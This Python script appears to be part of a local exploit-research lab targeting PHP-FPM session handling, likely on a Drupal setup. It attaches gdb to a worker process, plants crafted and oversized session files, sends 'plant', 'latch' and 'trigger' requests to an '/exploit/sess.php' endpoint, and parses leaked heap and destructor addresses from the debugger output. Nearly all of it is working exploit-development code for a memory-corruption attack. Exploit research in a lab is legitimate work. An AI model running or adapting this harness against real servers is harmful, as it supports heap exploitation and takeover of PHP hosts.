#!/usr/bin/env python3
"""Calibration no-upload-progress: session_start() in script, OOM, worker survives."""
import json, os, re, sys, time, subprocess
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, logmsg
WORKER = int(sys.argv[1]) if len(sys.argv)>1 else 0
SIZE = int(sys.argv[2]) if len(sys.argv)>2 else 65000
GDBSCRIPT = sys.argv[3] if len(sys.argv)>3 else LAB+"/gdb/gb_cal.gdb"
OUT = LAB + "/arms/cal2_%d_%s.json" % (SIZE, os.path.basename(GDBSCRIPT).replace('.gdb',''))

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

def parse_map(lines):
    out={}
    for l in lines:
        m=re.search(r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)",l)
        if m and 'X' not in out: out['X']=int(m.group(1),16); out['Xlen']=int(m.group(2))
        m=re.search(r"PHPRQ_START heap=(0x[0-9a-f]+)",l)
        if m and 'heap' not in out: out['heap']=int(m.group(1),16)
        m=re.search(r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+)",l)
        if m: out['P']=int(m.group(1),16); out['B0']=int(m.group(2),16)
    return out

def benign_record(total):
    L=total-8-len(str(total))
    while True:
        t=8+len(str(L))+L
        if t==total: break
        L+=total-t
    rec=b'x|s:%d:"'%L+b"A"*L+b'";'
    assert len(rec)==total
    return rec

w = WORKER or current_worker()
res={'size':SIZE,'worker0':w,'gdbscript':GDBSCRIPT}
if not w: raise SystemExit('no worker')
open(tool.GLOG,'w').close()
gout=open(LAB+'/logs/gdb_cal2.out','wb')
g=subprocess.Popen(['gdb','-q','--batch','-x',GDBSCRIPT,'-p',str(w)],stdout=gout,stderr=subprocess.STDOUT,cwd=LAB,start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and 'armed' in open(tool.GLOG,errors='replace').read(): armed=True; break
    time.sleep(0.1)
res['gdb_armed']=armed
if not armed:
    print(open(LAB+'/logs/gdb_cal2.out',errors='replace').read()[-4000:]); raise SystemExit(2)

def req(tag,cookie):
    return tool.post('/exploit/sess.php',[field('form',b'x')],tag=tag,timeout=60,cookie=cookie)

res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
n0=tool.req_count(); r=req('cal2_plant','pl1'); res['plant']={'status':r['status'],'head':r['body'][:120].decode('latin1')}
time.sleep(1.0); lines=tool.lines_for(n0+1); res['plant_map']=parse_map(lines); res['plant_lines']=lines; res['worker_after_plant']=current_worker()
open(os.path.join(tool.SESS,'sess_la1'),'wb').write(b'B'*4984996)
n1=tool.req_count(); r=req('cal2_latch','la1'); res['latch']={'status':r['status'],'head':r['body'][:120].decode('latin1')}
time.sleep(1.0); res['latch_lines']=tool.lines_for(n1+1); res['worker_after_latch']=current_worker()
rec=benign_record(SIZE); res['trigger_seed']=tool.seed(os.path.join(tool.UP,'sess_tb1'),rec)
qs='&'.join('q%d=%s'%(i,tool.SESS) for i in range(8)); target='/exploit/sess.php?'+qs
n2=tool.req_count(); r=tool.post(target,[field('form',b'x')],tag='cal2_trigger',timeout=60,cookie='tb1'); res['trigger']={'status':r['status'],'head':r['body'][:160].decode('latin1'),'target':target}
time.sleep(1.2); lines=tool.lines_for(n2+1); res['trigger_lines']=lines
res['trigger_decodes']=[l for l in lines if 'SESSION_DECODE' in l]
res['trigger_open']=[l for l in lines if 'PSFILES_OPEN' in l]
res['trigger_write']=[l for l in lines if 'PS_WRITE' in l]
res['file']={'len':os.path.getsize(os.path.join(tool.UP,'sess_tb1'))}
res['worker_end']=current_worker()
json.dump(res,open(OUT,'w'),indent=1)
print(json.dumps({k:res.get(k) for k in ('worker0','plant_map','plant','latch','trigger','trigger_decodes','trigger_open','trigger_write','file','worker_after_plant','worker_after_latch','worker_end')},indent=1))
